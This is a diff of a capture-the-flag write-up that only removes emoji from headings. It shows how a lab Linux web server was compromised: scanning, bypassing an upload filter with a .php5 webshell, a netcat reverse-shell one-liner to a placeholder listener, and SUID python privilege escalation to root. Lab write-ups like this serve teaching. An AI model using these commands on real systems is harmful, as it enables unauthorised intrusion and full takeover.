@@ -8,9 +8,9 @@ This CTF focused on gaining access to a vulnerable web server via a file upload 
 
 ---
 
-## 🎯 Target: Linux Web Server
+## Target: Linux Web Server
 
-### 🔍 Nmap Scan
+### Nmap Scan
 
 ~~~bash
 nmap -sS -sV -sC -T4 <IP>
@@ -26,7 +26,7 @@ nmap -sS -sV -sC -T4 <IP>
 
 ---
 
-## 🌐 Web Enumeration
+## Web Enumeration
 
 Performed manual inspection of the website and only found very basic static content, no clear entry points. Moved on to directory brute-forcing.
 
@@ -40,7 +40,7 @@ gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 
 ---
 
-## 📤 File Upload Bypass
+## File Upload Bypass
 
 Visited `/panel` and tested uploading a basic PHP webshell:
 
@@ -57,7 +57,7 @@ Tested:
 
 ---
 
-## 🐚 Gaining a Shell
+## Gaining a Shell
 
 Accessed the uploaded webshell via:
 
@@ -78,11 +78,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
 
 It failed due to special characters. Fixed it using [urlencoder.io](https://www.urlencoder.io/), and it worked.
 
-✅ **Result:** Gained a reverse shell as a low-privileged user.
+**Result:** Gained a reverse shell as a low-privileged user.
 
 ---
 
-## 🧭 Post-Exploitation Enumeration
+## Post-Exploitation Enumeration
 
 Performed basic enumeration of the system.
 
@@ -92,11 +92,11 @@ Found the first flag:
 cat /home/<user>/user.txt
 ~~~
 
-✅ **User flag captured.**
+**User flag captured.**
 
 ---
 
-## 🔓 Privilege Escalation
+## Privilege Escalation
 
 Checked for SUID binaries:
 
@@ -115,7 +115,7 @@ Searched GTFOBins and used the following command:
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ~~~
 
-✅ **Root shell obtained.**
+**Root shell obtained.**
 
 Retrieved root flag:
 
@@ -123,11 +123,11 @@ Retrieved root flag:
 cat /root/root.txt
 ~~~
 
-✅ **Root flag captured.**
+**Root flag captured.**
 
 ---
 
-## 🧠 Summary
+## Summary
 
 | Phase | Key Finding |
 |-------|-------------|
@@ -139,7 +139,7 @@ cat /root/root.txt
 
 ---
 
-## 💡 Lessons Learned
+## Lessons Learned
 
 - File upload filters can often be bypassed using lesser-known extensions like `.php5`  
 - Public upload directories paired with weak validation are high-risk entry points  
